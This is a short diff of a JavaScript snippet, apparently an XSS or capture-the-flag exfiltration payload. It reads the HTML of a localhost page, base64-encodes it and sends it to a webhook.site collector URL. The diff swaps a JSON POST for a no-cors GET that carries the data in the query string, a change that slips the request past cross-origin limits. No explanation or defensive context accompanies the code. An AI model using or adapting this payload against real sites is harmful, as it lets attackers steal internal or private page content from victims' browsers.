@@ -5,12 +5,7 @@ fetch('https://localhost:3000/')
     const base64Encoded = btoa(unescape(encodeURIComponent(html)));
     
     // Send the encoded HTML to the webhook
-    return fetch('https://webhook.site/e884e5ed-6253-41b6-8a52-f4868457bd7a', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({ data: base64Encoded })
+    return fetch('https://webhook.site/e884e5ed-6253-41b6-8a52-f4868457bd7a?ans=' + base64Encoded, { method: "GET", mode: "no-cors"
     });
   })
   .then(response => console.log('Data sent successfully'))
